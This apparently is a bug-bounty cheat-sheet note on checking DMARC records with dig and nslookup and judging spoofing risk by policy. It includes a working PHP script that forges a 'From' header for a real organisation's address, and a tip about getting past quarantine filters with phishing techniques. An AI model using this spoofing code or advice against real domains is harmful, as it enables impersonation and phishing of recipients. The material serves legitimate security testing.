- DMARC Analysis
- https://hackerone.com/reports/496360
  ```code
  dig TXT _dmarc.example.com +short
  => "v=DMARC1; p=none; rua=mailto:dmarc-reports@example.com; ruf=mailto:forensics@example.com"
  ```

  ```
  <?php
  $to = "hackthedevil@weareonhackerone.com";
  $subject = "Email Spoofing Test";
  $txt = "This is Email Spoofing";
  $headers = "From: contact@khanacademy.org";
  mail($to,$subject,$txt,$headers);
  ?>
  ```

  ```
  nslookup -type=TXT _dmarc.example.com
  _v=DMARC1; p=reject; rua=mailto:reports@example.com_
  ```
  ```
  🔹 **p=none** → The policy is weak; spoofed emails will not be blocked.  
  🔹 **p=quarantine** → Spoofed emails will be moved to the spam folder but not rejected.  
  🔹 **p=reject** → Spoofed emails will be completely rejected, making it the most secure option.  
  
  ✅ If the domain uses **p=none**, there is a high chance of successful **email spoofing**.  
  ✅ If the domain uses **p=quarantine**, you can try bypassing the filter using **advanced phishing techniques**.
  ```
